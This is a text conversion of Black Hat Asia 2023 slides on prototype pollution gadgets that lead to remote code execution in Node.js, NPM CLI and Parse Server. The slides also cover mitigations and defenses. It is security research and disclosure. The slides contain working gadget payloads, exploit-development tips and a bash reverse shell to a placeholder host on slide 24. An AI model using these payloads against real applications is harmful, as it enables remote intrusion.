---
title: "Prototype Pollution Leads to RCE"
speakers: ["Shcherbakov"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2023"
edition: "ASIA"
year: 2023
source_pdf: "Black Hat Asia 2023 slides/AS-23-Shcherbakov-Prototype-Pollution-Leads-to-RCE.pdf"
pages: 53
sha256: "e7b1c1cad7b213e8aec450c54b021c057f99bf5f3a8c61a2a0c46d6e80a37658"
text_chars: 22471
ocr_pages: 2
has_ocr: true
redacted_secrets: 0
ocr_confidence: 88.0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T01:37:44Z"
---
# Prototype Pollution Leads to RCE

**Speakers:** Shcherbakov  
**Conference:** Black Hat ASIA 2023  
**Source:** `Black Hat Asia 2023 slides/AS-23-Shcherbakov-Prototype-Pollution-Leads-to-RCE.pdf` (53 pages)


## Slide 1

# Prototype Pollution Leads to RCE: Gadgets Everywhere

Mikhail Shcherbakov

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 92/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
ASIA &
MAY 11-12
BRIEFINGS
Prototype Pollution Leads to RCE:
Gadgets Everywhere
Mikhail Shcherbakov
#BHASIA @BlackHatEvents
```

## Slide 2

# **@** yu5k3

- Ph.D. student at KTH Royal Institute of Technology

- The research interests include Language-Based Security, Scalable Static Code Analysis, Dynamic Program Analysis.

- Came to security from Enterprise Application Development, 10+ years in Software Development industry.

- Participated in Microsoft, GitHub, and Open-Source bug bounty programs.

- Microsoft Most Valuable Professional (MVP) in 2016 – 2018.

#BHASIA @BlackHatEvents

## Slide 3

## Research Overview

<u>https://github.com/yuske/silent-spring</u>

**Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js.** Workflow: automated (green) and manual (blue) steps.

#BHASIA @BlackHatEvents

## Slide 4

## Research Overview

<u>https://github.com/yuske/silent-spring</u>

**Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js.** Workflow: automated (green) and manual (blue) steps.

#BHASIA @BlackHatEvents

## Slide 5

## Research Overview

**Reported Vulnerabilities:**

▪ NPM CLI RCE (NO CVE but $11K bounty)

- Parse Server RCE (CVE-2022-24760)

- Parse Server RCE (CVE-2022-39396)

- Parse Server RCE (CVE-2022-41878)

- Parse Server RCE (CVE-2022-41879)

- Parse Server RCE (waiting for CVE)

- Rocket.Chat RCE (CVE-2023-23917)

- 3 RCEs in another popular product

<u>https://github.com/yuske/silent-spring</u>

#BHASIA @BlackHatEvents

## Slide 6

### Prototype Pollution: An Unexpected Journey

#BHASIA @BlackHatEvents

## Slide 7

## Prototype-based inheritance in JS

```
consto1= {};
```

#BHASIA @BlackHatEvents

## Slide 8

## Prototype-based inheritance in JS

```
consto1= {};
o1.__proto__.x= 42;
```

#BHASIA @BlackHatEvents

## Slide 9

## Prototype-based inheritance in JS

```
consto1= {};
o1.__proto__.x= 42;
consto2= {};
console.log(o2.x);
// Output: 42
```

#BHASIA @BlackHatEvents

## Slide 10

## Prototype Pollution (PP)

The input attacker-controlled data. The reference to _Object.prototype_ .

**Gadget** `function execHelper(args, options){ const` `cmd` `= options.shell || 'cmd.exe /k';` **options.shell = ‘calc’** `return exec(`$` `{cmd}` `${args}`);`

obj w/ prototype
function entryPoint (arg1, arg2, arg3) {
const obj = {};
PP
const p = obj [arg1] ;
p[arg2] = arg3;
obj[‘__proto__’]
return p;
} }
Object.prototype[‘shell’] = ‘calc’
entryPoint (argv[1] , argv[2] , argv[3]) ;
/* ... */
execHelper('dir', {});
‘calc’
‘__proto__’
‘shell’

#BHASIA @BlackHatEvents

## Slide 11

#### Most popular Node.js app (NPM CLI) analysis

**Threat Model:** ▪ Arbitrary script execution upon package install with the _-_ _-ignore-scripts_ flag. ▪ Arbitrary code execution from a command **<u>https://github.com/npm/cli</u>** that should not modify the package tree. ▪ Authentication disclosure. **NPM CLI** is the command line ▪ Credentials being leaked in logs. client that allows developers to install and publish ▪ Package integrity compromise. packages to NPM registries. ▪ Overwriting an executable with a globally **<u>https://github.com/github/codeql</u>** ~~installed packa~~ ge. **<u>https://github.com/yuske/silent-spring</u>**

#BHASIA @BlackHatEvents

## Slide 12

## NPM CLI Prototype Pollution

The input attacker-controlled data. The reference to _Object.prototype_ .

**PP**

function diffApply(obj, diff)  {
var lastProp = diff.path.pop() ;
var thisProp;
while (( thisProp = diff.path.shift()) != null) {
if (!( thisProp in obj)) {
obj[thisProp] = {};
}
obj = obj [thisProp] ;
}
if (diff.op === REPLACE || diff.op === ADD) {
obj[lastProp] = diff.value;
}
}

#BHASIA @BlackHatEvents

## Slide 13

## NPM CLI Gadget

```
constgitEnv= {
GIT_ASKPASS:'echo',
GIT_SSH_COMMAND:'ssh-oStrictHostKeyChecking=accept-new’
}
```

```
function makeOpts(opts = {})
return {
stdioString:true,
...opts,
shell:false,
env:opts.env|| { ...gitEnv, ...process.env}
}
```

`}` **undefined obj w/ prototype** `require('child_process').spawn(gitPath, args, makeOpts(opts))`

#BHASIA @BlackHatEvents

## Slide 14

## Exploit Dev Tips

▪ Combine static and dynamic analysis. ▪ Static analysis:

Search by **child_process** by grep, Semgrep or CodeQL Search in a distributed product/production environment. ▪ Dynamic analysis: Use **`strace`** from <u>https://strace.io/</u> `strace -f -v -s 10000 -e execve node ./app.js`

#BHASIA @BlackHatEvents

## Slide 15

## RCE Gadgets in Node.js

#BHASIA @BlackHatEvents

## Slide 16

## child_process Implementation

```
functionspawn(file, args,options) {
```

```
options= normalizeSpawnArguments(file, args, options);
/* ... */
}
```

`function normalizeSpawnArguments(file, args,` `options` `) { if` `(options` `=== undefined)` `options` `= {};` **obj w/ prototype**

```
constenv= options.env|| process.env;
constenvPairs= [];
```

```
// Prototype values are intentionally included.
for(constkeyinenv) {
```

```
ArrayPrototypePush(envPairs, `${key}=${env[key]}`);
}
```

```
return{ ...options,  envPairs,  /* ... */ };
}
```

#BHASIA @BlackHatEvents

## Slide 17

## child_process Implementation

```
functionspawn(file, args, options) {
```

```
options= normalizeSpawnArguments(file, args, options);
/* ... */
```

```
}
```

```
functionnormalizeSpawnArguments(file, args, options) {
if(options=== undefined)
options= {};
```

```
constenv= options.env|| process.env;
constenvPairs= [];
```

```
// Prototype values are intentionally included.
for(constkeyinenv) {
```

```
varoptions= {
```

```
cwd:process.cwd,
env:process.env,
argv0:process.argv[0],
input:"", // override stdio[0]
stdio:// stdioconfiguration
uid: // see setuid(2)
gid: // see setgid(2)
serialization: 'json',
shell:false, // can be a string
timeout:undefined,
/* ... */
}
```

```
ArrayPrototypePush(envPairs, `${key}=${env[key]}`);
}
```

```
return{ ...options,  envPairs,  /* ... */ };
}
```

#BHASIA @BlackHatEvents

## Slide 18

## child_process Implementation

```
functionspawn(file, args, options) {
```

```
options= normalizeSpawnArguments(file, args, options);
/* ... */
}
```

```
functionnormalizeSpawnArguments(file, args, options) {
if(options=== undefined)
```

```
options= {};
```

```
constenv= options.env|| process.env;
constenvPairs= [];
```

```
// Prototype values are intentionally included.
for(constkeyinenv) {
```

```
varoptions= {
cwd:process.cwd,
env:process.env,
argv0:process.argv[0],
input:"",    // override stdio[0]
stdio:// stdioconfiguration
uid:          // see setuid(2)
gid:          // see setgid(2)
serialization: 'json',
shell:false, // can be a string
timeout:undefined,
/* ... */
}
```

```
ArrayPrototypePush(envPairs, `${key}=${env[key]}`);
}
```

```
return{ ...options,  envPairs,  /* ... */ };
}
```

#BHASIA @BlackHatEvents

## Slide 19

## child_process Gadget I (Windows)

```
const{ execSync} = require('child_process’);
// Prototype pollution
Object.prototype.shell= 'cmd.exe.';
Object.prototype.input= 'echo PWNED\n’;
// Gadget
constoutput= execSync('ping 127.0.0.1');
console.log(output.toString());
// Output: PWNED
```

#BHASIA @BlackHatEvents

## Slide 20

## child_process Gadget II (Cross-Platf.)

```
const{ spawnSync} = require('child_process');
```

```
// Prototype pollution
Object.prototype.shell= "/usr/local/bin/node";
Object.prototype.NODE_OPTIONS= '--inspect-brk=0.0.0.0:1337’;
// Gadget
```

```
constoutput= spawnSync('ping', ['-c', '4', '127.0.0.1']);
console.log(output.toString());
```

#BHASIA @BlackHatEvents

## Slide 21

## Shell for Gadget II (Cross-Platf.)

```
constclient= newrequire('lib/internal/inspect_client.js')();
awaitclient.connect(1337, 'X.X.X.X');
```

- `// Set callbacks`

```
awaitclient.addListener('Debugger.paused', async() =>{
letoutput= awaitclient.callMethod("Runtime.evaluate", {
expression:`require('child_process').execSync('${cmd}').toString()`
});
```

- `});`

```
awaitclient.callMethod("Runtime.evaluate", {
expression:"process.on('exit', (code) => {debugger;})"
});
```

```
// Continue execution
```

```
awaitclient.callMethod("Runtime.runIfWaitingForDebugger");
```

#BHASIA @BlackHatEvents

## Slide 22

## More RCE Gadgets in Node.js

#BHASIA @BlackHatEvents

## Slide 23

## Kudos to Michał Bentkowski

“ What I found is basically a **prototype pollution gadget** . If any application is vulnerable to prototype pollution and it spawns a new node process , it can be exploited in exactly the same way “

#BHASIA @BlackHatEvents

## Slide 24

## child_process Michał’s Gadget (Linux)

```
const{ spawn} = require('child_process');
```

```
// Prototype pollution
Object.prototype.env= {
```

```
AAAA:'require("child_process").execSync("bash -i>& /dev/tcp/X.X.X.X/1337 0>&1");//',
NODE_OPTIONS:'--require /proc/self/environ'
```

```
}
```

```
// Gadget
spawn('node', ['app.js']);
```

#BHASIA @BlackHatEvents

## Slide 25

## Kudos to Michał Bentkowski

“

What I found is basically a **prototype pollution gadget** . If any application is vulnerable to prototype pollution and it spawn a new node process, it can be exploited in exactly the same way. “

“

It is nice that we can exploit prototype pollution in _spawn_ but would be even better if we found more functions (like _require_ ) that could be exploitable . “

#BHASIA @BlackHatEvents

## Slide 26

## require Gadget

```
// Prototype pollution
Object.prototype.main=
'/home/user/path/to/malicious.js';
```

```
// Gadget requires the absence of
// mainproperty in package.json
constbytes=require('bytes');
```

#BHASIA @BlackHatEvents

## Slide 27

## require Gadget

```
// Prototype pollution
Object.prototype.main=
'/home/user/path/to/malicious.js';
```

```
// Gadget requires the absence of
// main property in package.json
constbytes=require('bytes');
```

```
// lib\internal\modules\cjs\loader.js
constjsonPath= path.resolve(dir, 'package.json');
```

```
constjson= packageJsonReader.read(jsonPath).str;
if(json=== undefined) {
```

```
returnfalse;
```

```
}
```

```
constparsed=JSON.Parse(json);
constfiltered= {
```

```
main:parsed.main,
```

```
exports:parsed.exports,
/* ... */
```

```
};
```

```
returnfiltered;
```

#BHASIA @BlackHatEvents

## Slide 28

## Gadget Cocktail

```
// Prototype pollution
Object.prototype.main=
"/usr/XXX.js"
Object.prototype.NODE_OPTIONS=
"--inspect-brk=0.0.0.0:1337";
// Gadget
constbytes=require('bytes');
```

#BHASIA @BlackHatEvents

## Slide 29

## Gadget Cocktail

```
// Prototype pollution
Object.prototype.main=
"/usr/lib/node_modules/corepack/dist/npm.js"
Object.prototype.NODE_OPTIONS=
"--inspect-brk=0.0.0.0:1337";
```

```
// corepack/dist/npm.js
#!/usr/bin/envnode
```

```
require('./corepack’)
.runMain(['npm', ...args]);
```

```
// Gadget
constbytes=require('bytes');
```

#BHASIA @BlackHatEvents

## Slide 30

## Exploit Dev Tips

- The main issue of **require** / **import** gadgets exploitation is caching of loaded modules.

- Combine static and dynamic analysis again.

- Emulate the polluted property by an unenumerable property in _Object.prototype_ . `Object.defineProperty(Object.prototype, 'main', {`

```
get(){
```

```
if(this['main___']) returnthis['main___'];
console.log('MAIN DETECTED');
returnundefined;
```

```
},
```

```
set(val){ this['main___'] = val},
enumerable:false
```

```
});
```

#BHASIA @BlackHatEvents

## Slide 31

## Exploit Dev Tips

- The main issue of **require** / **import** gadgets exploitation is caching of loaded modules.

- Combine static and dynamic analysis again.

- Emulate the polluted property by an unenumerable property in _Object.prototype_ .

- Run a script that enumerates all packages that do not have _main_ property in package.json.

- Connect to the analyzed process by a debugger and collect all loaded modules.

   - `require('fs').writeFileSync(`

```
'loaded-packages.txt',
Object.keys(require.cache).join('\n')
)
```

#BHASIA @BlackHatEvents

## Slide 32

## Exploit Dev Tips

- The main issue of **require** / **import** gadgets exploitation is caching of loaded modules.

- Combine static and dynamic analysis again.

- Emulate the polluted property by an unenumerable property in _Object.prototype_ .

- Run a script that enumerates all packages that do not have _main_ property in package.json.

- Connect to the analyzed process by a debugger and collect all loaded modules.

- Filter out the loaded modules from the list of _non-main_ modules.

   - `if (process.env.LOG_LEVEL === 'debug') { const monitor = require('pg-monitor');`

      - `/* ... */`

   - `}`

#BHASIA @BlackHatEvents

## Slide 33

## Mitigations by Node.js team

#BHASIA @BlackHatEvents

## Slide 34

## child_process Implementation

```
functionspawn(file, args,options) {
options= normalizeSpawnArguments(file, args,options);
/* ... */
}
```

`function normalizeSpawnArguments(file, args,` `options` `) { if` `(options` `=== undefined)` `options` `= {};` **obj w/ prototype**

```
constenv= options.env|| process.env;
constenvPairs= [];
```

```
// Prototype values are intentionally included.
for(constkeyinenv) {
```

```
ArrayPrototypePush(envPairs, `${key}=${env[key]}`);
}
```

```
return{ ...options,  envPairs,  /* ... */ };
}
```

#BHASIA @BlackHatEvents

## Slide 35

## child_process Mitigations

```
constkEmptyObject= ObjectFreeze({ __proto__:null});
functionspawn(file, args,options) {
```

```
options= normalizeSpawnArguments(file, args,options);
/* ... */
}
```

`function normalizeSpawnArguments(file, args,` `options` `) { if` `(options` `=== undefined)` `options` `= kEmptyObject;` **obj w/o prototype**

```
constenv= options.env|| process.env;
constenvPairs= [];
```

```
// Prototype values are intentionally included.
for(constkeyinenv) {
```

```
ArrayPrototypePush(envPairs, `${key}=${env[key]}`);
}
```

```
return{ ...options,  envPairs,  /* ... */ };
}
```

#BHASIA @BlackHatEvents

## Slide 36

## child_process Mitigations

```
constkEmptyObject= ObjectFreeze({ __proto__:null});
functionspawn(file, args, options) {
```

```
options= normalizeSpawnArguments(file, args, options);
/* ... */
}
```

```
functionnormalizeSpawnArguments(file, args, options) {
if(options=== undefined)
```

`options = kEmptyObject; const` `env` `= options.env || process` `.env` `;` **obj w/ prototype** `const envPairs = [];`

```
// Prototype values are intentionally included.
for(constkeyinenv) {
```

```
ArrayPrototypePush(envPairs, `${key}=${env[key]}`);
}
```

```
return{ ...options,  envPairs,  /* ... */ };
```

```
}
```

#BHASIA @BlackHatEvents

## Slide 37

## NPM CLI Gadget is still Exploitable

`const gitEnv = { GIT_ASKPASS: 'echo', GIT_SSH_COMMAND: 'ssh -oStrictHostKeyChecking=accept-new’ }` **return obj w/ prototype** `function makeOpts(opts = {}) return { stdioString: true, ...opts, shell: false, env: opts.env || { ...gitEnv, ...process.env } } }` **opts w/ prototype** `require('child_process').spawn(gitPath, args, makeOpts(opts))`

#BHASIA @BlackHatEvents

## Slide 38

## require Implementation

```
// lib\internal\modules\cjs\loader.js
constjsonPath= path.resolve(dir, 'package.json');
```

```
constjson= packageJsonReader.read(jsonPath).str;
if(json=== undefined) {
```

```
returnfalse;
}
```

```
constparsed=JSON.Parse(json);
constfiltered= {
```

```
main:parsed.main,
exports:parsed.exports,
/* ... */
```

```
};
```

```
returnfiltered;
```

#BHASIA @BlackHatEvents

## Slide 39

## require Mitigations

```
// lib\internal\modules\cjs\loader.js
constjsonPath= path.resolve(dir, 'package.json');
```

```
constjson= packageJsonReader.read(jsonPath).str;
if(json=== undefined) {
returnfalse;
}
```

```
constfiltered=filterOwnProperties(JSONParse(json),
[
'name',
'main',
'exports',
'imports',
'type',
]);
```

```
returnfiltered;
```

#BHASIA @BlackHatEvents

## Slide 40

## New require Gadget

```
// Prototype pollution
Object.prototype.main=
'/home/user/path/to/malicious.js';
```

```
// Gadget requires the absence of
// package.jsonin the directory
constbytes=require('./dir');
```

```
// lib\internal\modules\cjs\loader.js
constjsonPath= path.resolve(dir, 'package.json');
```

```
constjson= packageJsonReader.read(jsonPath).str;
if(json=== undefined) {
```

```
returnfalse;
}
```

```
constfiltered= filterOwnProperties(JSONParse(json),
[
```

```
'name',
'main',
'exports',
'imports',
'type',
]);
```

```
returnfiltered;
```

#BHASIA @BlackHatEvents

## Slide 41

## New import Gadget

```
// Prototype pollution
Object.prototype.source= 'console.log("PWNED")';
// Gadget
import('./file.mjs')
// Output: PWNED
```

#BHASIA @BlackHatEvents

## Slide 42

## Gadgets in 3<sup>rd</sup> Party Packages

#BHASIA @BlackHatEvents

## Slide 43

## Overview

We continue our research of gadget detection in Node.js stdlib and 3<sup>rd</sup> party packages. **Paul Moosbrugger** implemented the dynamic analysis tool on top of <u>GraalVM</u> and Truffle. Our preliminary analysis detects RCE gadgets in NPM packages: ▪ BSON parser of the official MongoDB client https://www.npmjs.com/package/bson

- Embedded JavaScript templates EJS https://www.npmjs.com/package/ejs

- Popular email sender https://www.npmjs.com/package/nodemailer

- GraphicsMagick for Node.js https://www.npmjs.com/package/gm

#BHASIA @BlackHatEvents

## Slide 44

## Parse Server Attacker Model

```
functionexpandResultOnKeyPath(obj, key, res) {
if(key.indexOf('.') < 0) {
obj[key] = res[key];
returnobj;
}
```

```
constpath= key.split('.');
constfirstKey= path[0];
constnextPath= path.slice(1).join('.');
obj[firstKey] = expandResultOnKeyPath(
obj[firstKey] || {},
nextPath, res[firstKey]);
returnobj;
}
```

PP

```
js-bson
```

RCE

```
constevalFunctions=
options['evalFunctions'] == null
? false
: options['evalFunctions’];
if(evalFunctions) {
eval(functionString);
}
```

#BHASIA @BlackHatEvents

## Slide 45

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 84/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
res yuske @ubuntu: ~/src/parse-server-bootstrap Q = - o © {/home/yuske/src} - Far 2.3 20211219-ae94eF3 x64 yuske@ubuntu - Oo ®&
endency f= .../yuske/src/parse-server-bootstrap =|
(node:54833) Warning: Accessing non-existent property 'remove' of module exports inside circular depe ||" Name Name n Name Name
Vande sanas) Warning: Accessing non-existent property 'updateOne' of module exports inside circular d |icloud fastjson
Se eiectrecton true logs infer A
appId: appo node_modules JavaAnalysis
appName: TestApp public node-tests
cacheMaxSize: 10000 config. json npm-rce-git-hijacki}
cacheTTL: 5000 package. json parse-server -bootst}
databaseURI: mongodb://127.0.0.1:27017/parse pwnphare
enableAnonymousUsers: true radamsa
expireInactiveSessions: true parse-server-expLoi}
graphQLPath: /graphql test.js
host: 0.0.0.0
logsFolder: ./logs
masterKey: ***REDACTED***
masterKeylIps: []
maxUploadSize: 20mb
mountPath: /parse
objectIdSize: 10
playgroundPath: /playground
port: 1337
revokeSessionOnPasswordReset: true
schemaCacheTTL: 5000
sessionLength: 31536000
allowCustomObjectId: false
collectionPrefix:
directAccess: false
enableExpressErrorHandler: false
enableSingleSchemaCache: false
mountGraphQL: false
mountPlayground: false
preserveFileName: false
preventLoginWithUnverifiedEmail: false
scheduledPush: false
skipMongoDBServer13732Workaround: false
verifyUserEmails: false
jsonLogs: false
verbose: false
level: undefined
serverURL: http://localhost:1337/parse
```

## Slide 46

## Exploit Dev Tips

- Try to trigger RCE gadget in race condition way, i.e., sending tens of requests in parallel and one PP trigger request in the middle of this set.

- Add expected properties in _Object.prototype_ to fix “Cannot read property 'XXX' of undefined” and TypeError exceptions.

- Prevent infinite recursion in your payload.

- `Object.prototype.foo = {};`

   - `({}).foo.foo.foo.foo.foo !== null;`

#BHASIA @BlackHatEvents

## Slide 47

## Exploit Dev Tips

- Try to trigger RCE gadget in race condition way, i.e., sending tens of requests in parallel and one PP trigger request in the middle of this set.

- Add expected properties in _Object.prototype_ to fix “Cannot read property 'XXX' of undefined” and TypeError exceptions.

- Prevent infinite recursion in your payload.

```
Object.prototype.foo= { 'foo':null};
```

- `({}).foo.foo === null;`

#BHASIA @BlackHatEvents

## Slide 48

## Exploit Dev Tips

- Try to trigger RCE gadget in race condition way, i.e., sending tens of requests in parallel and one PP trigger request in the middle of this set.

- Add expected properties in _Object.prototype_ to fix “Cannot read property 'XXX' of undefined” and TypeError exceptions.

- Prevent infinite recursion in your payload.

```
Object.prototype.foo= { '__proto__':null};
```

- `({}).foo.foo === undefined;`

#BHASIA @BlackHatEvents

## Slide 49

## Conclusions

#BHASIA @BlackHatEvents

## Slide 50

## Defense

- Consider an option to use a null prototype for new objects by `Object.create(null)` or setting null to `__proto__` property.

- Use standard built-in objects `Map` and `Set` to store key-value pairs and unique values.

- Check any object that are created outside of your code, i.e., parameters of your public functions, result of `JSON.parse()` and other API calls:

- Validate them by schema for JSON data. Be sure that your schema validation checks properties of prototypes as well.

- Copy only own properties to an object without prototype or `Map` and use it instead of the original one. `function copyOwnProperties (source) { const result = Object.create(null);`

      - `for (const key of Object.getOwnPropertyNames(source)) result[key] = source[key];`

      - `return result;`

   - `}`

#BHASIA @BlackHatEvents

## Slide 51

## References

- Mikhail Shcherbakov, Musard Balliu and Cristian-Alexandru Staicu “Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js“, USENIX Security ’23. <u>https://github.com/yuske/silent-spring https://github.com/yuske/server-side-prototype-pollution</u>

- Gareth Heyes “Server-side prototype pollution: Black-box detection without the DoS”, read the <u>blog post</u> and watch the <u>video</u> from Nullcon Berlin 2023.

- .

- ▪ Olivier Arteau “Prototype Pollution Attack in NodeJS application”, 2018, the <u>paper</u>

- Michał Bentkowski “Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)”, .

- read the <u>blog post</u>

#BHASIA @BlackHatEvents

## Slide 52

## Black Hat Sound Bytes

- Prototype Pollution leads to RCE. It becomes easy to exploit by known gadgets.

- Combine Prototype Pollution with other vulnerabilities or race conditions to achieve RCE.

- Developers, care about Prototype Pollution gadgets! The mitigations of Prototype Pollution gadgets can protect your app from RCE in the end.

#BHASIA @BlackHatEvents

## Slide 53

## Black Hat Sound Bytes

- Prototype Pollution leads to RCE. It becomes easy to exploit by known gadgets.

- Combine Prototype Pollution with other vulnerabilities or race conditions to achieve RCE.

- Developers, care about Prototype Pollution gadgets! The mitigations of Prototype Pollution gadgets can protect your app from RCE in the end.

**Thank you for your attention! kth.se/profile/msh** Thanks for your attention! **twitter.com/yu5k github.com/yuske c 3** `#61` https://twitter.com/yu5k3

```
#61
```

#BHASIA @BlackHatEvents
